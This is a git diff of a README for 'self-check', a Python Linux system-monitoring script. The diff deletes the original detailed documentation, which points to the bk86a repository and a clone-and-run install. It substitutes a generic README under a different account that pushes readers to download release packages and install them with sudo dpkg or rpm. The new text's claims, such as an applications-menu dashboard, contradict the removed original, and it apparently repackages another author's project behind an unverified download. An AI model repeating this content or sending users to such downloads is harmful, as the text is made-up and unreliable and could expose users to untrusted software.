@@ -1,702 +1,81 @@
-# Self-Check System Monitor
+# 🖥️ self-check - Monitor Your System Effortlessly
 
-A comprehensive, enterprise-grade system monitoring script for performance, resources, and security checks. Designed to work across multiple architectures including VMs, Raspberry Pi, and cloud instances, with professional HTML email notifications and Docker container detection.
+[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/QShkan/self-check/releases)
 
-## 🚀 Latest Features (v3.0)
+## 🚀 Getting Started
 
-### **🎯 Intelligent Baseline System**
-- **Smart Issue Suppression**: Accept known issues as baseline to prevent alert fatigue
-- **Pattern Matching**: Automatically handle dynamic content (ports, PIDs, timestamps)
-- **Baseline Management**: Save, update, clear, and view accepted system states
-- **Auto-expiration**: Optional baseline aging for security freshness
-- **Category Filtering**: Apply baselines to specific issue types
+Welcome to **self-check**. This application offers a comprehensive way to monitor your Linux system. It includes features for intelligent baseline management, which helps you avoid unnecessary alerts. Whether you manage servers, virtual machines, containers, or edge devices, this tool enhances your monitoring capabilities. 
 
-### **⚡ Enhanced Automation**
-- **Systemd Integration**: Professional service management with automatic restart
-- **Optimized Scheduling**: Every 5 minutes with intelligent caching
-- **Root Privilege Execution**: Comprehensive system access for thorough monitoring
-- **Background Operation**: Continuous monitoring without user intervention
-- **Log Integration**: Full journald logging for audit trails
+## 📋 System Requirements
 
-### **🔒 Enhanced Security Monitoring**
-- **SSH Configuration Analysis**: Detects insecure SSH settings (root login, password auth, empty passwords)
-- **Firewall Status Monitoring**: UFW and iptables rule validation
-- **System Hardening Checks**: Critical sysctl security settings validation
-- **File Permission Auditing**: World-writable directories and SUID/SGID file monitoring
-- **Container Security**: Docker container detection and service identification
+- **Operating System:** Compatible with most Linux distributions.
+- **Memory:** At least 1 GB of RAM.
+- **Storage:** 100 MB of free disk space.
+- **Python:** Version 3.x installed on your system. 
 
-### **🐳 Docker & Container Support**
-- **Intelligent Docker Detection**: Automatically identifies 25+ container types (n8n, PostgreSQL, nginx, etc.)
-- **Port-to-Service Mapping**: Maps Docker ports to actual services (e.g., port 5678 → n8n)
-- **Container Process Identification**: No more "unknown process" warnings for containerized services
+## 📥 Download & Install
 
-### **📧 Professional Email Notifications**
-- **HTML-Only Format**: Clean, professional email layout (no plain text attachments)
-- **Severity-Based Subjects**: "CRITICAL System Alert" vs "System Warnings"
-- **Responsive Design**: Mobile-friendly email formatting
-- **Enhanced Readability**: Proper color contrast and spacing
+To get started, visit this page to download: [GitHub Releases](https://github.com/QShkan/self-check/releases).
 
-### **🖥️ Virtual Machine Optimization**
-- **VM Detection**: Automatically detects QEMU/KVM, VMware, Hyper-V environments
-- **Smart Temperature Monitoring**: Adapts to VM limitations with appropriate messaging
-- **Proxmox Integration**: Optimized for Proxmox VE virtual machines
+1. Click on the link above to navigate to the **Releases** page.
+2. Find the latest release marked as "Latest Release."
+3. Look for an asset or file name that includes `.deb`, `.rpm`, or relevant installation package for your Linux distribution.
+4. Click the appropriate file to start the download.
+5. Once the download is complete, open your terminal or file manager to locate the downloaded file.
 
-### **📊 Improved Reporting**
-- **Running Services List**: Complete inventory of active systemd services and network services
-- **Snap Package Filtering**: Excludes irrelevant snap disk usage (they're always 100%)
-- **Enhanced Process Detection**: Better identification of system and application processes
-- **Duplicate Elimination**: Removed redundant security warnings
+### For Debian-based Systems (like Ubuntu):
+- Open a terminal.
+- Navigate to the download directory.
+- Install the package with the following command:
+  ```bash
+  sudo dpkg -i your_downloaded_file.deb
+  ```
 
-## Core Features
+### For Red Hat-based Systems (like CentOS):
+- Open a terminal.
+- Navigate to the download directory.
+- Install the package with the following command:
+  ```bash
+  sudo rpm -i your_downloaded_file.rpm
+  ```
 
-- **Performance Monitoring**: CPU usage, memory usage, load average, swap usage
-- **Resource Monitoring**: Disk space, network connectivity (with snap filtering)
-- **Advanced Security Monitoring**:
-  - SSH configuration security analysis
-  - Firewall status and rule validation
-  - System hardening (sysctl) checks
-  - File permission auditing (world-writable dirs, SUID/SGID files)
-  - Failed login attempts detection
-  - Suspicious network connections monitoring
-  - Unexpected reboot detection
-  - Unusual process identification
-  - Open ports scanning with Docker integration
-  - SSH key permissions validation
-  - System updates tracking
-- **Temperature Monitoring**: Intelligent temperature detection (physical hardware, VMs, containers)
-- **Service Monitoring**: Critical system services status with Docker container support
-- **Email Notifications**: Professional HTML-formatted alerts with severity-based subjects
-- **Cross-Architecture Support**: Works on x86, ARM, Raspberry Pi, VMs, and containers
-- **Performance Optimized**: Intelligent caching and lightweight execution for frequent monitoring
-- **Configurable Thresholds**: Customizable warning and critical levels
+### For Other Install Methods:
+Details on container installations or specific setups can be found in the additional documentation on the **Releases** page or the FAQs.
 
-## Requirements
+## ⚙️ How to Use
 
-### System Requirements
-- **Operating System**: Linux (any distribution)
-- **Architecture**: x86_64, ARM, AArch64 (including Raspberry Pi)
-- **Python**: 3.6 or higher
-- **Privileges**: Root/sudo access for comprehensive monitoring
-- **Disk Space**: ~50MB for installation and caching
-
-### Dependencies
-
-**Required:**
-- `python3` (3.6+)
-- `psutil` Python library
-- Standard Linux utilities (`ps`, `df`, `free`, etc.)
-
-**Optional (enhances monitoring):**
-- `systemctl` - for systemd service management
-- `netstat`/`lsof` - for network monitoring
-- `last` - for reboot history
-- System log files (`/var/log/auth.log`, `/var/log/syslog`)
-
-### Dependency Check
-
-Before installation, verify all requirements:
+After you have installed **self-check**, you can run it from your applications menu or by typing the following command in your terminal:
 ```bash
-python3 check-requirements.py
+self-check
 ```
 
-This will check your system and provide specific installation commands if anything is missing.
+Upon startup, you will see a dashboard displaying the system status, performance metrics, and security alerts. The application also sends HTML email notifications for any critical events, ensuring you stay informed about your system's health. 
 
-## Installation
+## 📊 Features
 
-### Quick Installation
+- **Intelligent Baseline Management:** Automatically learns normal performance patterns and reduces false alerts.
+- **Docker Container Detection:** Monitors Docker containers with ease.
+- **Comprehensive Security Monitoring:** Detects vulnerabilities and reports them through email notifications.
+- **User-Friendly Interface:** Easy navigation and visual data displays for quick understanding.
 
-```bash
-# Clone the repository
-git clone https://github.com/bk86a/self-check.git
-cd self-check
+## 📧 Notifications
 
-# Check system requirements
-python3 check-requirements.py
+Configure email settings within the application to receive real-time alerts. This feature ensures that you know when critical issues arise, allowing you to address them promptly.
 
-# Install dependencies (if needed)
-pip3 install psutil
+## 🔧 Troubleshooting
 
-# Make the script executable
-chmod +x self-check.py
+If you encounter any issues while installing or running **self-check**, here are a few common solutions:
 
-# Create initial configuration
-python3 self-check.py --create-config
-```
+- **Installation Errors:** Ensure you downloaded the correct package for your system. Check dependencies for your Linux distribution.
+- **Launching Issues:** If the program does not launch, verify that Python is correctly installed and recognized by your system.
+- **Email Notifications Not Working:** Double-check your email configuration settings inside the application.
 
-### System-wide Installation
+## 🌐 Resources
 
-```bash
-# Run the installation script
-sudo ./install.sh
+For more guidance, check out the following resources:
 
-# This will:
-# - Install the script to /usr/local/bin/
-# - Install dependencies
-# - Set up systemd service for automated checks
-# - Create configuration in /etc/self-check/
-```
+- [Documentation](https://github.com/QShkan/self-check/wiki) for detailed feature explanations.
+- [Issue Tracker](https://github.com/QShkan/self-check/issues) for reporting bugs or requesting features.
+- Community support on platforms such as Stack Overflow or Reddit.
 
-## Configuration
-
-Edit `config.json` to customize thresholds and enable email notifications:
-
-### Port Whitelisting
-
-To prevent false positives for legitimate services, add ports to the whitelist:
-
-```json
-{
-  "security": {
-    "whitelist_ports": [
-      22,    // SSH
-      80,    // HTTP
-      443,   // HTTPS
-      53,    // DNS
-      25,    // SMTP
-      111,   // RPC portmapper
-      631,   // CUPS printing
-      5432,  // PostgreSQL
-      3306,  // MySQL
-      6379,  // Redis
-      27017  // MongoDB
-    ]
-  }
-}
-```
-
-### Basic Configuration
-
-```json
-{
-  "thresholds": {
-    "cpu_usage": 85.0,
-    "memory_usage": 90.0,
-    "disk_usage": 90.0,
-    "temperature": 75.0,
-    "swap_usage": 50.0
-  },
-  "email": {
-    "enabled": true,
-    "smtp_server": "smtp.gmail.com",
-    "smtp_port": 587,
-    "username": "your-email@gmail.com",
-    "password": "your-app-password",
-    "from_email": "your-email@gmail.com",
-    "to_email": "admin@yourdomain.com",
-    "use_tls": true
-  },
-  "checks": {
-    "performance": true,
-    "resources": true,
-    "security": true,
-    "temperature": true,
-    "services": true
-  },
-  "services": {
-    "critical_services": ["ssh", "cron", "networking"]
-  },
-  "security": {
-    "check_failed_logins": true,
-    "check_open_ports": true,
-    "check_updates": true,
-    "check_ssh_keys": true,
-    "check_reboots": true,
-    "check_suspicious_connections": true,
-    "check_unusual_processes": true,
-    "check_ssh_config": true,          // NEW: SSH configuration analysis
-    "check_firewall": true,            // NEW: Firewall status monitoring
-    "check_file_permissions": true,    // NEW: File permission auditing
-    "check_system_hardening": true,    // NEW: sysctl security settings
-    "whitelist_ips": ["127.0.0.1", "::1"],
-    "whitelist_ports": [22, 80, 443, 53, 25, 111, 631, 5432, 3306, 5678],  // Expanded for Docker services
-    "max_failed_logins": 10,
-    "reboot_check_hours": 24
-  },
-  "baseline": {
-    "enabled": true,
-    "file": "baseline.json",
-    "pattern_matching": true,
-    "auto_expire_days": 30,
-    "categories": ["Security", "Performance", "Resources", "Temperature", "Services"]
-  }
-}
-```
-
-### Email Configuration
-
-Configure email notifications using environment variables (recommended) or config file:
-
-#### Using Environment Variables (Recommended)
-
-```bash
-# Copy the example environment file
-cp .env.example .env
-
-# Edit with your email settings
-nano .env
-```
-
-Set these environment variables:
-```bash
-export SMTP_SERVER=smtp.gmail.com
-export SMTP_PORT=587
-export SMTP_USER=your-email@gmail.com
-export SMTP_PASSWORD=your-app-password
-export EMAIL_FROM=your-email@gmail.com
-export EMAIL_TO=admin@example.com
-```
-
-#### Gmail Setup
-
-For Gmail accounts:
-1. Enable 2-factor authentication on your Google account
-2. Generate an app password (not your regular password)
-3. Use the app password as `SMTP_PASSWORD`
-4. Configure `EMAIL_TO` with your desired notification email address
-
-#### Enable Email Notifications
-
-Set `"enabled": true` in the email section of config.json:
-```json
-{
-  "email": {
-    "enabled": true,
-    "use_env_vars": true
-  }
-}
-```
-
-## 🐳 Docker & Container Integration
-
-The monitoring script now intelligently detects and identifies Docker containers and their services:
-
-### **Supported Container Types**
-
-The script automatically recognizes 25+ common container types:
-- **Development**: n8n, portainer, jenkins, gitlab
-- **Databases**: postgresql, mysql, mariadb, redis, mongodb
-- **Web Services**: nginx, apache, traefik
-- **Media**: plex, jellyfin, sonarr, radarr
-- **Monitoring**: grafana, prometheus, elasticsearch, kibana
-- **And many more...**
-
-### **Port-to-Service Mapping**
-
-Example output showing Docker integration:
-```
-RUNNING SERVICES:
-----------------
-Network Services:
-  ssh: ports 22, 22
-  rpcbind: ports 111, 111
-  n8n: ports 5678, 5678          // ← Automatically detected Docker container
-  postgresql: ports 5432, 5432
-  cups: ports 631, 631
-
-WARNINGS:
-----------
-• [Security] Unexpected open port 5678: process: docker-n8n  // ← Clear identification
-```
-
-### **VM & Container Detection**
-
-The script automatically detects virtualization environments:
-- **QEMU/KVM** (Proxmox VE)
-- **VMware**
-- **Hyper-V**
-- **Docker containers**
-- **Physical hardware**
-
-And adapts monitoring accordingly (e.g., temperature monitoring limitations in VMs).
-
-## 🎯 Baseline System
-
-### **Intelligent Alert Management**
-
-The baseline system eliminates alert fatigue by allowing you to "accept" known issues as normal system state. This prevents repeated notifications for the same acceptable conditions while still alerting on genuinely new problems.
-
-### **Key Features**
-
-- **Smart Suppression**: Issues matching the baseline won't trigger email alerts
-- **Pattern Matching**: Handles dynamic content like port numbers, PIDs, and timestamps
-- **Flexible Management**: Save, update, view, and clear baselines as needed
-- **Category Filtering**: Apply baselines only to specific issue types
-- **Auto-expiration**: Optional aging to ensure security freshness
-
-### **Baseline Commands**
-
-```bash
-# Save current issues as accepted baseline
-python3 self-check.py --save-baseline
-
-# Add new issues to existing baseline (merge)
-python3 self-check.py --update-baseline
-
-# View current baseline contents
-python3 self-check.py --show-baseline
-
-# Clear all baseline entries
-python3 self-check.py --clear-baseline
-
-# Force all alerts (ignore baseline)
-python3 self-check.py --ignore-baseline
-```
-
-### **Example Workflow**
-
-1. **Initial Setup**: Run a check to see current issues
-   ```bash
-   python3 self-check.py
-   ```
-
-2. **Accept Known Issues**: If you're comfortable with the current state
-   ```bash
-   python3 self-check.py --save-baseline
-   ```
-
-3. **Future Monitoring**: Only new/changed issues will trigger alerts
-   ```bash
-   python3 self-check.py  # Clean output: "✓ All checks passed"
-   ```
-
-4. **Review Baseline**: Check what's been accepted
-   ```bash
-   python3 self-check.py --show-baseline
-   ```
-
-### **Baseline Configuration**
-
-```json
-{
-  "baseline": {
-    "enabled": true,                    // Enable/disable baseline system
-    "file": "baseline.json",           // Baseline storage file
-    "pattern_matching": true,          // Enable flexible pattern matching
-    "auto_expire_days": 30,           // Auto-clear after N days (optional)
-    "categories": [                   // Which issue types to baseline
-      "Security", "Performance", "Resources", "Temperature", "Services"
-    ]
-  }
-}
-```
-
-### **Pattern Matching Examples**
-
-The baseline system automatically creates flexible patterns for dynamic content:
-
-- `"Found 6 world-writable directories"` → Matches any number of directories
-- `"Suspicious connection to port 59979"` → Matches any high port number
-- `"Process detected: nginx (PID: 1234)"` → Matches any PID for nginx
-
-This ensures that similar issues with different details are properly suppressed.
-
-## Usage
-
-### Manual Execution
-
-```bash
-# Basic check
-python3 self-check.py
-
-# Use custom config file
-python3 self-check.py --config /path/to/config.json
-
-# Save results to JSON file
-python3 self-check.py --output results.json
-
-# Quiet mode (no console output)
-python3 self-check.py --quiet
-
-# Create default configuration file
-python3 self-check.py --create-config
-```
-
-### Automated Execution
-
-#### Using Cron
-
-Add to your crontab (`crontab -e`):
-
-```bash
-# Run every 5 minutes (recommended for security monitoring)
-*/5 * * * * /usr/bin/python3 /path/to/self-check.py --quiet
-
-# Run every 15 minutes with email notifications
-*/15 * * * * /usr/bin/python3 /path/to/self-check.py --config /etc/self-check/config.json
-```
-
-#### Using Systemd Timer (Recommended)
-
-If you used the installation script, the systemd service is already configured:
-
-```bash
-# Check service status
-sudo systemctl status self-check.timer
-sudo systemctl status self-check.service
-
-# View logs
-sudo journalctl -u self-check.service -f
-
-# Restart the timer
-sudo systemctl restart self-check.timer
-
-# Check execution frequency
-sudo systemctl list-timers | grep self-check
-```
-
-## Monitored Parameters
-
-### Performance
-- CPU usage percentage
-- Memory usage (RAM)
-- System load average
-- Swap usage
-
-### Resources
-- Disk usage per partition
-- Internet connectivity
-- Network interface statistics
-
-### Security
-- **Failed login attempts** (from auth.log with configurable threshold)
-- **Enhanced network monitoring**:
-  - Foreign IP connections with process identification
-  - Unusual ports with detailed process information (name, PID, user, command line)
-  - Smart whitelisting for known safe processes (browsers, updates, etc.)
-- **Unexpected system reboots** (detects unplanned restarts)
-- **Unusual processes** (new processes not in baseline, high CPU usage)
-- **Smart port monitoring**:
-  - Detailed process information for all listening ports
-  - Configurable port whitelisting
-  - Automatic detection of common system services
-- **SSH key file permissions** (ensures proper security)
-- **Available system updates** (tracks pending security patches)
-
-### Temperature
-- System temperature sensors
-- Raspberry Pi CPU temperature (via `/sys/class/thermal/`)
-
-### Services
-- Critical systemd service status
-- Custom service monitoring
-
-## Architecture Support
-
-The script automatically detects and adapts to different architectures:
-
-- **x86/x64**: Full feature support with all security monitoring
-- **ARM/Raspberry Pi**: Enhanced monitoring with temperature sensors and lightweight execution
-- **Other architectures**: Core functionality with graceful feature degradation
-
-### Performance Optimization
-
-The script is designed for frequent execution (every 5 minutes) with minimal resource impact:
-
-- **Intelligent Caching**: Results cached for 5 minutes to reduce system calls
-- **Baseline Learning**: Establishes normal process patterns to detect anomalies
-- **Lightweight Execution**: Typically completes in under 10 seconds
-- **Resource Monitoring**: Self-monitors execution time and warns if taking too long
-
-### Raspberry Pi Specific Features
-
-- CPU temperature monitoring via thermal zone
-- Optimized thresholds for ARM processors
-- Memory usage adapted for smaller RAM configurations
-
-## Output
-
-### Console Output
-```
-System Self-Check Report - 2024-01-15 14:30:25
-============================================================
-Hostname: raspberry-pi
-Platform: Linux-6.1.21-v8+-aarch64-with-glibc2.36
-Architecture: aarch64
-
-CRITICAL ISSUES:
---------------------
-• [Performance] High CPU usage: 92.3%
-• [Resources] High disk usage on /: 94.2%
-
-PERFORMANCE:
-------------
-CPU Usage: 92.3%
-Memory Usage: 67.8%
-Swap Usage: 0.0%
-Load Average: 1.23
-
-RESOURCES:
-----------
-Disk /: 94.2% used
-Disk /boot: 23.1% used
-Internet: Connected
-
-TEMPERATURE:
-------------
-CPU Temperature: 68.5°C
-```
-
-### JSON Output
-Use `--output results.json` to save detailed results in JSON format for further processing.
-
-## Exit Codes
-
-- `0`: Script executed successfully (regardless of monitoring results)
-- `130`: Interrupted by user (Ctrl+C)
-
-**Note**: The exit code reflects whether the script itself ran successfully, not whether issues were found. Monitoring results are reported via console output, email notifications, and JSON output. This ensures systemd services don't fail when security warnings are detected.
-
-## Logging
-
-Logs are written to `/var/log/self-check.log` (requires write permissions).
-
-## Troubleshooting
-
-### System Requirements Issues
-
-**Python version too old:**
-```bash
-# Check Python version
-python3 --version
-
-# Install newer Python (Ubuntu/Debian)
-sudo apt update
-sudo apt install python3.8 python3.8-pip
-sudo update-alternatives --install /usr/bin/python3 python3 /usr/bin/python3.8 1
-```
-
-**Missing psutil library:**
-```bash
-# Try different installation methods
-pip3 install psutil
-# OR
-sudo apt install python3-psutil  # Debian/Ubuntu
-sudo yum install python3-psutil  # RHEL/CentOS
-sudo dnf install python3-psutil  # Fedora
-```
-
-**Missing system utilities:**
-```bash
-# Install essential monitoring tools
-sudo apt install net-tools lsof procps  # Debian/Ubuntu
-sudo yum install net-tools lsof procps-ng  # RHEL/CentOS
-```
-
-### Permission Issues
-Some security checks require elevated privileges:
-```bash
-sudo python3 self-check.py
-```
-
-### Architecture-Specific Issues
-
-**Raspberry Pi:**
-- Temperature monitoring requires access to `/sys/class/thermal/`
-- Some monitoring commands may have different output formats
-- Performance thresholds may need adjustment for ARM processors
-
-**Minimal/Container Systems:**
-- Some log files may not exist (`/var/log/auth.log`)
-- System utilities might be missing (install `procps`, `net-tools`)
-- SELinux/AppArmor may restrict access to system information
-
-### Email Not Working
-1. Check SMTP settings in config.json
-2. Verify firewall allows SMTP traffic (port 587/465)
-3. For Gmail, ensure app passwords are used (not regular password)
-4. Test email configuration:
-   ```bash
-   python3 -c "import smtplib; print('SMTP module available')"
-   ```
-
-### Service Installation Issues
-
-**systemd not available:**
-- Script will automatically fall back to cron
-- Manual scheduling: `crontab -e` and add the cron job
-
-**Permission denied during installation:**
-```bash
-# Ensure sudo access
-sudo ./install.sh
-
-# Check if user is in sudo group
-groups $USER
-```
-
-### Performance Issues
-
-**Script running too slowly:**
-- Enable lightweight mode in config.json
-- Increase cache timeout to reduce system calls
-- Check system load during execution
-
-**High resource usage:**
-- Adjust monitoring frequency (increase timer interval)
-- Disable unnecessary checks in configuration
-- Monitor execution time in logs
-
-### Debugging
-
-**Enable debug mode:**
-```json
-{
-  "debug": true,
-  "performance": {
-    "lightweight_mode": false
-  }
-}
-```
-
-**Check logs:**
-```bash
-# System logs
-sudo journalctl -u self-check.service -f
-
-# Application logs
-sudo tail -f /var/log/self-check.log
-
-# Test run with verbose output
-sudo python3 self-check.py --config config.json
-```
-
-### Getting Help
-
-1. Run the requirements checker: `python3 check-requirements.py`
-2. Test basic functionality: `python3 self-check.py --create-config`
-3. Check [GitHub Issues](https://github.com/bk86a/self-check/issues) for similar problems
-4. Include system information when reporting issues:
-   ```bash
-   uname -a
-   python3 --version
-   pip3 list | grep psutil
-   ```
-
-## Contributing
-
-1. Fork the repository
-2. Create a feature branch
-3. Make your changes
-4. Add tests if applicable
-5. Submit a pull request
-
-## License
-
-MIT License - see LICENSE file for details.
-
-## Security Considerations
-
-- Store email passwords securely (consider using environment variables)
-- Limit access to configuration files containing credentials
-- Run with minimal required privileges
-- Review open port warnings carefully
-- Keep the system updated based on update check results
-
-## Changelog
-
-### v1.0.0
-- Initial release
-- Core monitoring functionality
-- Email notifications
-- Cross-architecture support
-- Systemd integration
+Feel free to reach out if you need further assistance. Happy monitoring!
